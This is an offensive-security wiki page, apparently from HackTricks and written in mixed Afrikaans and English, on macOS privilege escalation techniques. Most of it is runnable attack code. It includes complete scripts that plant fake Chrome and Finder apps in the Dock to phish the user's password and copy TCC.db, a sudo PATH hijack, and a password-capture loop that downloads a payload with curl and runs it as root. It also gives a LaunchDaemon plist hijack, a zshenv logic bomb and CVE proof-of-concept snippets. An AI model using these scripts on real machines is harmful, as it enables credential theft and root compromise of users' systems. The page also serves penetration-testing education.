# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

As jy hierheen gekom het op soek na TCC privilege escalation, gaan na:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Neem asseblief kennis dat **die meeste van die truuks oor privilege escalation wat Linux/Unix beïnvloed, ook MacOS-masjiene sal beïnvloed**. Sien:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Gebruikerinteraksie

### Sudo Hijacking

Jy kan die oorspronklike [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking) vind.

Tog, macOS **onderhou** die gebruiker se **`PATH`** wanneer hy **`sudo`** uitvoer. Dit beteken dat 'n ander manier om hierdie aanval uit te voer sou wees om **hijack other binaries** wat die slagoffer sal uitvoer wanneer hy **running sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Note that a user that uses the terminal will highly probable have **Homebrew installed**. So it's possible to hijack binaries in **`/opt/homebrew/bin`**.

### Dock Impersonation

Using some **social engineering** you could **impersonate for example Google Chrome** inside the dock and actually execute your own script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Sommige voorstelle:

- Kyk in die Dock of daar 'n Chrome is, en in daardie geval **verwyder** daardie item en **voeg** die **fake** **Chrome entry in the same position** in die Dock array.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Enkele voorstelle:

- You **cannot remove Finder from the Dock**, so if you are going to add it to the Dock, you could put the fake Finder just next to the real one. For this you need to **add the fake Finder entry at the beginning of the Dock array**.
- Another option is to not place it in the Dock and just open it, "Finder asking to control Finder" is not that weird.
- Another options to **escalate to root without asking** the password with a horrible box, is make Finder really ask for the password to perform a privileged action:
- Ask Finder to copy to **`/etc/pam.d`** a new **`sudo`** file (The prompt asking for the password will indicate that "Finder wants to copy sudo")
- Ask Finder to copy a new **Authorization Plugin** (You could control the file name so the prompt asking for the password will indicate that "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Wagwoordprompt-phishing + sudo-hergebruik

Malware misbruik dikwels gebruikersinteraksie om **'n sudo-bruikbare wagwoord vas te vang** en dit programmaties te hergebruik. 'n Algemene vloei:

1. Bepaal die aangemelde gebruiker met `whoami`.
2. **Herhaal wagwoordprompts** totdat `dscl . -authonly "$user" "$pw"` success teruggee.
3. Bêre die kredensiaal (bv. `/tmp/.pass`) en voer bevoorregte aksies uit met `sudo -S` (wagwoord oor stdin).

Voorbeeld van 'n minimale ketting:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Die gesteelde wagwoord kan dan hergebruik word om **Gatekeeper se kwarantyn skoon te maak met `xattr -c`**, LaunchDaemons of ander geprivilegieerde lêers te kopieer, en addisionele fases nie-interaktief uit te voer.

## Newer macOS-specific vectors (2023–2025)

### Verouderde `AuthorizationExecuteWithPrivileges` nog steeds bruikbaar

`AuthorizationExecuteWithPrivileges` is in 10.7 verouderd maar **werk nog steeds op Sonoma/Sequoia**. Baie kommersiële updaters roep `/usr/libexec/security_authtrampoline` aan met 'n onbetroubare pad. As die teiken-binary deur die gebruiker geskryfbaar is, kan jy 'n trojan plant en gebruik maak van die legitieme prompt:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Kombineer dit met die **masquerading tricks above** om 'n geloofwaardige wagwoord-dialoog voor te sit.

### Bevoorregte helper / XPC triage

Baie moderne derdeparty macOS privescs volg dieselfde patroon: 'n **root LaunchDaemon** openbaar 'n **Mach/XPC service** vanaf **`/Library/PrivilegedHelperTools`**, dan valider die helper óf **nie die kliënt** nie, valideer dit **te laat** (PID race), of openbaar 'n **root method** wat 'n **user-controlled path/script** verbruik. Dit is die foutklas agter baie onlangse helper-bugs in VPN clients, game launchers en updaters.

Vinnige triage kontrolelys:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Gee spesiale aandag aan helpers wat:

- aanvaar steeds versoeke **na deïnstallering** omdat die job in `launchd` gebly het
- scripts uitvoer of konfigurasie lees vanaf **`/Applications/...`** of ander paaie wat deur nie-root gebruikers geskryfbaar is
- staatmaak op **PID-based** of **bundle-id-only** peer-validasie wat moontlik deur 'n race condition uitgebuit kan word

Vir meer besonderhede oor helper-autoriseringsfoute, sien [this page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### PackageKit script environment inheritance (CVE-2024-27822)

Tot Apple dit reggestel het in **Sonoma 14.5**, **Ventura 13.6.7** en **Monterey 12.7.5**, kon gebruiker-geïnisieerde installasies via **`Installer.app`** / **`PackageKit.framework`** PKG-skripte as root binne die huidige gebruiker se omgewing uitvoer. Dit beteken 'n package wat **`#!/bin/zsh`** gebruik sou die aanvaller se **`~/.zshenv`** laai en dit as **root** uitvoer wanneer die slagoffer die package geïnstalleer het.

Dit is veral interessant as 'n **logic bomb**: jy het net 'n voet in die gebruiker se rekening en 'n skryfbare shell-opstartlêer nodig, en wag dan dat enige kwesbare **zsh-based** installer deur die gebruiker uitgevoer word. Dit is gewoonlik **nie** van toepassing op **MDM/Munki**-ontplooiings nie, omdat daardie binne die root-gebruiker se omgewing loop.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
As jy 'n dieper duik in installer-specific abuse wil hê, kyk ook na [this page](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

As 'n LaunchDaemon plist of die `ProgramArguments`-target daarvan **user-writable** is, kan jy eskaleer deur dit te ruil en dan launchd te dwing om te herlaai:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Dit weerspieël die exploit pattern gepubliseer vir **CVE-2025-24085**, waar 'n writable plist misbruik is om attacker code as root uit te voer.

### XNU SMR credential race (CVE-2025-24118)

'n **race in `kauth_cred_proc_update`** laat 'n lokale aanvaller toe om die read-only credential pointer (`proc_ro.p_ucred`) te korrupteer deur `setgid()`/`getgid()`-lusse oor drade te laat meeding totdat 'n torn `memcpy` plaasvind. Suksesvolle korrupsie lewer **uid 0** en kernel memory toegang. Minimale PoC-structuur:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Kombineer dit met heap grooming om beheerdata te plaas waar die pointer weer uitgelees word. Op kwesbare builds is dit 'n betroubare **local kernel privesc** sonder SIP-bypassvereistes.

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

As jy reeds root het, blokkeer SIP steeds skryfaksies na stelsel-ligginge. Die **Migraine**-bug misbruik die Migration Assistant-entitlement `com.apple.rootless.install.heritable` om 'n child process te spawn wat die SIP-bypass erwe en beskermde paaie oor skryf (bv. `/System/Library/LaunchDaemons`). Die ketting:

1. Verkry root op 'n lewende stelsel.
2. Trigger `systemmigrationd` met 'n geknutseld state om 'n attacker-controlled binary uit te voer.
3. Gebruik die geërfde entitlement om SIP-beskermde lêers te patch, wat selfs na 'n herbegin volhard.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Meerdere Apple-daemons aanvaar **NSPredicate**-objekte oor XPC en valideer slegs die veld `expressionType`, wat deur die aanvaller beheer word. Deur 'n predicate te konstrueer wat arbitrêre selectors evalueer, kan jy **code execution in root/system XPC services** bereik (bv. `coreduetd`, `contextstored`). Wanneer dit gekombineer word met 'n aanvanklike app sandbox escape, gee dit **privilege escalation without user prompts**. Soek na XPC-endpoints wat predicates deserialiseer en 'n robuuste visitor mis.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Enige gebruiker** (selfs ongeprivilegieerde gebruikers) kan 'n Time Machine snapshot skep en monteer en **TOEGANG TOT AL die lêers** van daardie snapshot kry.\
Die **enige voorreg** wat nodig is, is dat die toepassing wat gebruik word (soos `Terminal`) **Full Disk Access** (FDA) moet hê (`kTCCServiceSystemPolicyAllfiles`), wat deur 'n admin gegee moet word.

<details>
<summary>Monteer Time Machine snapshot</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

'n Meer gedetailleerde verduideliking kan [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Gevoelige Inligting

Dit kan nuttig wees om escalate privileges:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Verwysings

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
